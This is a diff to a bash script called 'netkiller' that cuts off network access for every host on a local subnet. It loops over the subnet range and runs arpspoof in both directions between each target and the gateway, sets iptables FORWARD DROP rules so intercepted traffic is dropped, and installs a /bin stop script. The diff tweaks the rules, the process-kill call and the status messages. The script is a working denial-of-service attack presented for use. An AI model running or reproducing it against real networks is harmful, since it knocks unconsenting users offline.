@@ -68,7 +68,7 @@ cat > /bin/netkiller-stop << EOF
 
 iptables -t nat -F
 iptables -F FORWARD
-pkill arpspoof
+pkill -f arpspoof
 echo "Restoring the connection..."
 EOF
 chmod 755 /bin/netkiller-stop
@@ -97,16 +97,16 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     END=$(ip2int $HOSTMAX)
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip $i)
-        (
             # Block all the traffic except the DEVICE IP and GATEWAY
             iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-            iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
-          
+            iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
+        (  
             arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
             arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
         ) &
     done
 fi
 
-echo "Attack is running against all possible hosts in $TARGET_SUBNET"
+echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
+echo ""
 echo "To stop, Type: sudo netkiller-stop"
